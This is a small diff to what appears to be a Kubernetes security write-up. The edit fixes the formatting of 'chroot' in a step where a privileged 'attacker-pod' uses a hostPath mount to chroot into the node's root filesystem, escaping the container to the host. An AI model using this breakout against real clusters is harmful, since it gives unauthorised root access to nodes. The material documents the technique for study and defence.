@@ -283,7 +283,7 @@ kubectl exec -it attacker-pod -n test -- bash
 root@workload-worker-nodepool-a1-m2r7d-847d79df59-69v67:/#
 ```
 
-Next we_chroot_ our process to the Node’s root filesystem accessible to us in _/host_ directory due to _hostPath_ volume mount.
+Next we *chroot* our process to the Node’s root filesystem accessible to us in _/host_ directory due to _hostPath_ volume mount.
 
 ```sh
 root@workload-worker-nodepool-a1-m2r7d-847d79df59-69v67:/# chroot /host/ bash
